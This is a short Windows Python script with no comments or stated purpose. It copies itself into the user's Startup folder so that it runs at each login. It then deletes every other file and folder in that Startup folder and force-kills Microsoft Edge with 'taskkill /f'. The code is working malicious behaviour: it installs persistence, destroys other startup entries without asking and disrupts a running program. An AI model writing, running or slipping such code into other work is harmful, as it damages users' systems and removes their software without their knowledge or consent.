import os
import shutil
user_home_dir = os.path.expanduser("~")
startup_folder_path = os.path.join(user_home_dir, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
current_script_path = os.path.abspath(__file__)
startup_script_path = os.path.join(startup_folder_path, os.path.basename(current_script_path))
if not os.path.exists(startup_script_path):
    os.makedirs(startup_folder_path, exist_ok=True)
    shutil.copy(current_script_path, startup_script_path)
    print(f"Script copied to startup folder: {startup_script_path}")
else:
    print("Script already exists in the startup folder.")
files_in_startup = os.listdir(startup_folder_path)
for file_name in files_in_startup:
    file_path = os.path.join(startup_folder_path, file_name)
    if file_path != startup_script_path:
        if os.path.isfile(file_path):
            os.remove(file_path)
            print(f"Deleted file: {file_path}")
        elif os.path.isdir(file_path):
            shutil.rmtree(file_path)
            print(f"Deleted directory: {file_path}")
os.system("taskkill /f /im msedge.exe")
